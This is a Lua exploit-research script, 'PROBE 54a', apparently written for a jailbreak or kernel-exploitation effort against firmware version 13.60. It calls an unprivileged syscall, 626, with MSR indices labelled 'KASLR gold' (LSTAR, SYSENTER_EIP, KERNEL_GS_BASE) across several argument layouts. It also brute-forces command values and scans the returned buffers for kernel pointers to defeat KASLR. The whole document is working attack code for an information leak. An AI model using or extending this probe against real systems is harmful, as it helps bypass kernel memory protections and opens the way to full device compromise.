-- CRASH_CLASS: MODERATE
-- PROBE 54a: Test sys 626 for direct RDMSR access
--
-- Context: Verified handler analysis found 39 RDMSR opcodes in the sys 626
-- handler with no priv_check in the 13.60 binary. RDMSR reads CPU
-- model-specific registers. If accessible, could leak kernel state,
-- timing info, or addresses useful for KASLR defeat.
--
-- Strategy: Try multiple MSR indices that are known to contain useful info:
-- - TSC (0x10): timestamp counter
-- - APIC_BASE (0x1B): local APIC physical address
-- - SYSENTER_EIP (0x176): kernel entry point address (KASLR gold)
-- - EFER (0xC0000080): extended feature enable
-- - STAR (0xC0000081): syscall target address
-- - LSTAR (0xC0000082): long mode syscall entry (KASLR gold)
-- - CSTAR (0xC0000083): compat mode syscall entry
-- - SFMASK (0xC0000084): syscall flag mask
-- - FS_BASE (0xC0000100): FS segment base
-- - GS_BASE (0xC0000101): GS segment base
-- - KERNEL_GS_BASE (0xC0000102): kernel GS base (KASLR gold)

print("=== PROBE 54a: RDMSR KERNEL LEAK TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc626 = make_syscall(626)

-- Output buffer for results
local outbuf = memory.alloc(0x1000)

-- Zero the buffer
for i = 0, 0xFF0, 4 do safe_wd(outbuf + i, 0) end

-- MSR indices to test
local msrs = {
    {0x10,       "IA32_TSC (timestamp counter)"},
    {0x1B,       "IA32_APIC_BASE (APIC phys addr)"},
    {0x176,      "IA32_SYSENTER_EIP (kernel entry)"},
    {0xC0000080, "IA32_EFER (extended features)"},
    {0xC0000081, "IA32_STAR (syscall target)"},
    {0xC0000082, "IA32_LSTAR (long syscall entry)"},
    {0xC0000083, "IA32_CSTAR (compat syscall entry)"},
    {0xC0000084, "IA32_SFMASK (syscall flag mask)"},
    {0xC0000100, "IA32_FS_BASE"},
    {0xC0000101, "IA32_GS_BASE"},
    {0xC0000102, "IA32_KERNEL_GS_BASE"},
}

print("[*] Testing sys 626 with various argument patterns")
print("")

-- Test 1: Basic call with no args (see what happens)
print("--- TEST 1: sys 626 bare call ---")
do
    for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0) end
    local ok, ret = pcall(function() return sc626(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if ok then
        print("  ret = " .. signed32(ret) .. " (" .. hexval(ret) .. ")")
    else
        print("  CRASHED: " .. tostring(ret))
    end
end
print("")

-- Test 2: Pass MSR index as arg1, outbuf as arg2
print("--- TEST 2: sys 626(msr_index, outbuf, outlen) ---")
for _, msr in ipairs(msrs) do
    local idx = msr[1]
    local name = msr[2]

    -- Zero output area
    for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0) end

    local idx_u64
    if idx >= 0x80000000 then
        idx_u64 = uint64(string.format("0x%X", idx))
    else
        idx_u64 = uint64(idx)
    end

    local ok, ret = pcall(function()
        return sc626(idx_u64, uint64(outbuf), uint64(64), uint64(0), uint64(0), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        local q1 = safe_rq(outbuf + 8)
        print(string.format("  MSR 0x%X %-35s ret=%d  buf[0]=%s  buf[8]=%s",
            idx, name, rv, hexval(q0), hexval(q1)))

        -- Check for kernel pointers
        if q0 then
            local h, l = get_hi_lo(q0)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print("  >>> KERNEL POINTER CANDIDATE: " .. hexval(q0))
            end
        end
        if q1 then
            local h, l = get_hi_lo(q1)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print("  >>> KERNEL POINTER CANDIDATE: " .. hexval(q1))
            end
        end
    else
        print(string.format("  MSR 0x%X %-35s CRASHED: %s", idx, name, tostring(ret)))
    end
end
print("")

-- Test 3: Try with outbuf as arg1 (different arg layout)
print("--- TEST 3: sys 626(outbuf, msr_index, outlen) ---")
for _, msr in ipairs(msrs) do
    local idx = msr[1]
    local name = msr[2]

    for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0) end

    local idx_u64
    if idx >= 0x80000000 then
        idx_u64 = uint64(string.format("0x%X", idx))
    else
        idx_u64 = uint64(idx)
    end

    local ok, ret = pcall(function()
        return sc626(uint64(outbuf), idx_u64, uint64(64), uint64(0), uint64(0), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        local q1 = safe_rq(outbuf + 8)
        print(string.format("  MSR 0x%X %-35s ret=%d  buf[0]=%s  buf[8]=%s",
            idx, name, rv, hexval(q0), hexval(q1)))
        if q0 then
            local h, l = get_hi_lo(q0)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print("  >>> KERNEL POINTER CANDIDATE: " .. hexval(q0))
            end
        end
    else
        print(string.format("  MSR 0x%X %-35s CRASHED: %s", idx, name, tostring(ret)))
    end
end
print("")

-- Test 4: Try passing MSR index in a struct (arg1=struct_ptr)
print("--- TEST 4: sys 626(struct_ptr) where struct has MSR index ---")
local structbuf = memory.alloc(0x100)
for _, msr in ipairs(msrs) do
    local idx = msr[1]
    local name = msr[2]

    -- Zero struct and output
    for i = 0, 0xFF, 4 do safe_wd(structbuf + i, 0) end
    for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0) end

    -- Pack MSR index at offset 0, outbuf ptr at offset 8, len at offset 16
    if idx >= 0x80000000 then
        safe_wd(structbuf, idx - 0x100000000 + 0x100000000) -- low 32
        safe_wd(structbuf + 4, 0)
    else
        safe_wd(structbuf, idx)
        safe_wd(structbuf + 4, 0)
    end
    safe_wq(structbuf + 8, uint64(outbuf))
    safe_wd(structbuf + 16, 64)

    local ok, ret = pcall(function()
        return sc626(uint64(structbuf), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        print(string.format("  MSR 0x%X %-35s ret=%d  buf[0]=%s",
            idx, name, rv, hexval(q0)))
        if q0 then
            local h, l = get_hi_lo(q0)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print("  >>> KERNEL POINTER CANDIDATE: " .. hexval(q0))
            end
        end
    else
        print(string.format("  MSR 0x%X %-35s CRASHED: %s", idx, name, tostring(ret)))
    end
end
print("")

-- Test 5: Brute small arg values (maybe it's a command index, not MSR)
print("--- TEST 5: sys 626(cmd, outbuf) for cmd 0-15 ---")
for cmd = 0, 15 do
    for i = 0, 0x7F, 4 do safe_wd(outbuf + i, 0) end
    local ok, ret = pcall(function()
        return sc626(uint64(cmd), uint64(outbuf), uint64(128), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        local q1 = safe_rq(outbuf + 8)
        local q2 = safe_rq(outbuf + 16)
        local q3 = safe_rq(outbuf + 24)
        print(string.format("  cmd=%2d  ret=%d  [0]=%s [8]=%s [16]=%s [24]=%s",
            cmd, rv, hexval(q0), hexval(q1), hexval(q2), hexval(q3)))

        -- Scan for kernel pointers in full output
        for i = 0, 120, 8 do
            local qv = safe_rq(outbuf + i)
            if qv then
                local h, l = get_hi_lo(qv)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    print(string.format("  >>> KPTR at +%d: %s", i, hexval(qv)))
                end
            end
        end
    else
        print(string.format("  cmd=%2d  CRASHED: %s", cmd, tostring(ret)))
    end
end

print("")
print("=== PROBE 54a COMPLETE ===")
